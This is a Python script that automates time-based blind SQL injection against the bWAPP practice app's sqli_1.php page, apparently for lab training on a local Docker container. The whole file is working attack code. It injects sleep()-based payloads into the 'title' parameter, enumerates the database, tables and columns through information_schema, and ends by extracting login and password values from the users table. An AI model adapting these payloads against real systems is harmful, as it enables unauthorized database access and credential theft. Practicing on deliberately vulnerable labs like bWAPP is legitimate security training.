#
# This script has to be used with bWAPP docker container for SQL time-based blind injection
#
# Docker command: docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
#

import requests 
import time

ip = 'http://127.0.0.1'
cookies = {
	'PHPSESSID': 'usn52auucfkgo5ms2f8udkove5',
	'security_level': '0'
}

TIME_INTERVAL = 1
MAX_COUNT = 100

# get length of name of current database
def get_length_of_db_name():
	for length in range(1, MAX_COUNT + 1):
		start_time = time.time()
		url = f"{ip}/sqli_1.php?title=World War Z' and length(database()) = {length} and sleep({TIME_INTERVAL}) -- &action=search"
		res = requests.get(url, cookies=cookies)
		end_time = time.time()

		if end_time - start_time > TIME_INTERVAL:
			return length

	return f"Database name is longer than {MAX_COUNT} chars"

# get the db name we want explode
def get_db_name(name_len):
	name = [''] * name_len
	match = 0
	for  ascii_code in range(33, 128):
		for pos, _ in enumerate(name, 1):
			start_time = time.time()
			url = f"{ip}/sqli_1.php?title=World War Z' and ascii(substring(database(), {pos}, 1)) = {ascii_code} and sleep({TIME_INTERVAL}) -- &action=search"
			res = requests.get(url, cookies=cookies)
			end_time = time.time()

			if end_time - start_time > TIME_INTERVAL:
				name[pos - 1] = chr(ascii_code)
				match += 1
				continue

		if match == name_len:
			name = ''.join(name)
			print(f"get_db_name: We found the match, database name is {name}")
			break
	
	return name if match == name_len else None

# get count of tables under a specific database
def get_table_count(db_name):
	for count in range(1, MAX_COUNT + 1):
		start_time = time.time()
		url = f"{ip}/sqli_1.php?title=World War Z' and if((select count(*) from information_schema.tables where table_schema = '{db_name}') = {count}, 1, 0) and sleep({TIME_INTERVAL}) -- &action=search"
		res = requests.get(url, cookies=cookies)
		end_time = time.time()
		if end_time - start_time > TIME_INTERVAL:
			return count

	return f"Table count in {db_name} is more than {MAX_COUNT}"

# get name of all tables under a specific database
def get_table_names(db_name, count):
	names = []
	for pos in range(0, count):
		name_len = 0
		# get length of each table's name
		for length in range(1, MAX_COUNT + 1):
			start_time = time.time()
			url = f"{ip}/sqli_1.php?title=World War Z' and length((select table_name from information_schema.tables where table_schema = '{db_name}' limit {pos}, 1)) = {length} and sleep({TIME_INTERVAL}) -- &action=search"
			res = requests.get(url, cookies=cookies)
			end_time = time.time()
			if end_time - start_time > TIME_INTERVAL:
				name_len = length
				break
		print(f"get_table_names: Found a table name with a length of {length}")

		# get actual name of each table
		name = [''] * name_len
		match = 0
		for  ascii_code in range(33, 128):
			for index, _ in enumerate(name, 1):
				start_time = time.time()
				url = f"{ip}/sqli_1.php?title=World War Z' and ascii(substring((select table_name from information_schema.tables where table_schema = '{db_name}' limit {pos}, 1), {index}, 1)) = {ascii_code} and sleep({TIME_INTERVAL}) -- &action=search"
				res = requests.get(url, cookies=cookies)
				end_time = time.time()

				if end_time - start_time > TIME_INTERVAL:
					name[index - 1] = chr(ascii_code)
					match += 1
					continue
		
			if match == name_len:
				name = ''.join(name)
				names.append(name)
				print(f"get_table_names: We found the match, table name is {name}")
				break

	return names

# get fields of target table
def get_fields_count(db_name, table_name):
	for count in range(1, MAX_COUNT + 1):
		start_time = time.time()
		url = f"{ip}/sqli_1.php?title=World War Z' and if((select count(*) from information_schema.columns where table_name = '{table_name}') = {count}, 1, 0) and sleep({TIME_INTERVAL}) -- &action=search"
		res = requests.get(url, cookies=cookies)
		end_time = time.time()
		if end_time - start_time > TIME_INTERVAL:
			return count

	return f"Table count in {db_name} is more than {MAX_COUNT}"	

# get filed
def get_field_names(db_name, table_name, fields_count):
	fields = []
	for pos in range(0, fields_count):
		name_len = 0
		# get length of each table's name
		for length in range(1, MAX_COUNT + 1):
			start_time = time.time()
			url = f"{ip}/sqli_1.php?title=World War Z' and length((select column_name from information_schema.columns where table_schema = '{db_name}' and table_name = '{table_name}' limit {pos}, 1)) = {length} and sleep({TIME_INTERVAL}) -- &action=search"
			res = requests.get(url, cookies=cookies)
			end_time = time.time()
			if end_time - start_time > TIME_INTERVAL:
				name_len = length
				break
		print(f"get_field_names: Found a fields name with a length of {length}")

		# get actual name of each table
		name = [''] * name_len
		match = 0
		for  ascii_code in range(33, 128):
			for index, _ in enumerate(name, 1):
				start_time = time.time()
				url = f"{ip}/sqli_1.php?title=World War Z' and ascii(substring((select column_name from information_schema.columns where table_schema = '{db_name}' and table_name = '{table_name}' limit {pos}, 1), {index}, 1)) = {ascii_code} and sleep({TIME_INTERVAL}) -- &action=search"
				res = requests.get(url, cookies=cookies)
				end_time = time.time()

				if end_time - start_time > TIME_INTERVAL:
					name[index - 1] = chr(ascii_code)
					match += 1
					continue
		
			if match == name_len:
				name = ''.join(name)
				fields.append(name)
				print(f"get_field_names: We found the match, field name is {name}")
				break

	return fields


# length = get_length_of_db_name()
# name = get_db_name(length)
# names = get_table_names('bWAPP', get_table_count('bWAPP'))

# get total rows of a table
def get_table_row_count(db_name, table_name):
	for count in range(1, MAX_COUNT + 1):
		start_time = time.time()
		url = f"{ip}/sqli_1.php?title=World War Z' and if((select count(id) from {db_name}.{table_name}) = {count}, 1, 0) and sleep({TIME_INTERVAL}) -- &action=search"
		res = requests.get(url, cookies=cookies)
		end_time = time.time()
		if end_time - start_time > TIME_INTERVAL:
			return count

	return f"Results count in {db_name}.{table_name} is more than {MAX_COUNT}"	

# get all values of a specific field
def get_field_values(db_name, table_name, field_name, total_count):
	values = []
	for pos in range(0, total_count):
		name_len = 0
		# get length of each table's name
		for length in range(1, MAX_COUNT + 1):
			start_time = time.time()
			url = f"{ip}/sqli_1.php?title=World War Z' and length((select {field_name} from {db_name}.{table_name} limit {pos}, 1)) = {length} and sleep({TIME_INTERVAL}) -- &action=search"
			res = requests.get(url, cookies=cookies)
			end_time = time.time()
			if end_time - start_time > TIME_INTERVAL:
				name_len = length
				break
		print(f"get_field_values: Found a fields value with a length of {length}")

		# get actual name of each table
		name = [''] * name_len
		match = 0
		for  ascii_code in range(33, 128):
			for index, _ in enumerate(name, 1):
				start_time = time.time()
				url = f"{ip}/sqli_1.php?title=World War Z' and ascii(substring((select {field_name} from {db_name}.{table_name} limit {pos}, 1), {index}, 1)) = {ascii_code} and sleep({TIME_INTERVAL}) -- &action=search"
				res = requests.get(url, cookies=cookies)
				end_time = time.time()

				if end_time - start_time > TIME_INTERVAL:
					name[index - 1] = chr(ascii_code)
					match += 1
					continue
		
			if match == name_len:
				name = ''.join(name)
				values.append(name)
				print(f"get_field_values: We found the match, field values is {name}")
				break

	return values

# get all values of specific fields
def get_all_field_values(db_name, table_name, fields):
	results = []
	for field in fields:
		values = get_field_values(db_name, table_name, field, get_table_row_count(db_name, table_name))
		results.append(values)

	return zip(*(results))

# We can use different combinations of above functions to get fields values of tables under specific database, in order to reduce the time needed here, i'm using some known facts to experiment
print(get_all_field_values('bWAPP', 'users', ['id', 'login', 'password']))
